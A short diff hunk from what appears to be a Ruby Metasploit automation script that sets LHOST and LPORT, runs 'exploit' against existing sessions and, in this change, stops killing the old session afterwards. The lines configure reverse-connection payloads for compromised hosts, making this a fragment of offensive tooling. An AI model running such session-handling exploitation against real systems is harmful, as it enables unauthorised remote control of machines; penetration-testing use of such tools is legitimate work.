@@ -39,8 +39,6 @@ exploit -j -z
                 s.console.run_single("set LHOST $LHOST")
                 s.console.run_single("set LPORT 12345")
                 s.console.run_single("exploit")
-				print_status("Closing session #{sid} #{thost}...")
-				s.kill
 			else
 				print_status("Session #{sid} #{thost} active, but not yet configured")
 			end
